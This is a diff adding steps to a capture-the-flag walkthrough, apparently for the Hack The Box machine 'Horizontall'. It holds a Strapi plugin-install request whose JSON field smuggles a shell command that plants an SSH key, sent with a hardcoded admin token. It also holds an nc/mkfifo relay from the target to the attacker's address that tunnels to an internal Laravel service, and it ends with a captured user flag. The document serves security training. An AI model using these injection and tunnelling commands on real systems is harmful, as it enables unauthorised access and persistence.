@@ -132,5 +132,49 @@ strapi@horizontall:~/myapi$ uname -a
 Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 ````
 
+8. Find a ssh user and add the public key to authorized keys
+
+````
+$ export PUBLIC_KEY=$(cat htb.pub)
+
+$ export DATA='{"plugin":"documentation && $(mkdir /opt/strapi/.ssh; echo "'$PUBLIC_KEY'" >> /opt/strapi/.ssh/authorized_key)","port":"1337"}'
+$ curl -i \
+-X POST \
+-H 'Host: api-prod.horizontall.htb' \
+-H 'Content-Type: application/json' \
+-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNjg1Mzg2LCJleHAiOjE2NDQyNzczODZ9.hC7xIJQQyHmfa3qOc2AmnyCTOkhgJcmZx1-_sERq_n4' --data-binary '$DATA' 'http://api-prod.horizontall.htb/admin/plugins/install'
+````
+
+9. Ncat the hard way
+
+````bash
+attacker1> # mkfifo backpipe; nc -lvp 8000 < backpipe | nc -lnvp 53 > backpipe; rm backpipe
+listening on [any] 8000 ...listening on [any] 53 ...
+
+target> $ mkfifo backpipe; nc 10.10.14.221 53 < backpipe | nc 127.0.0.1 8000 > backpipe; rm backpipe
+
+attacker2> # curl http://127.0.0.1:8000
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Laravel</title>
+
+        <!-- Fonts -->
+        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+
+        <!-- Styles -->
+
+attacker1> 
+listening on [any] 8000 ...listening on [any] 53 ...
+
+connect to [10.10.14.221] from (UNKNOWN) [10.10.11.105] 51192
+connect to [127.0.0.1] from localhost [127.0.0.1] 49714
+````
+
+      
+  
 # Secrets
 * FLAG_USER = edb3997bc0e86f32c6c9f363dddeee33
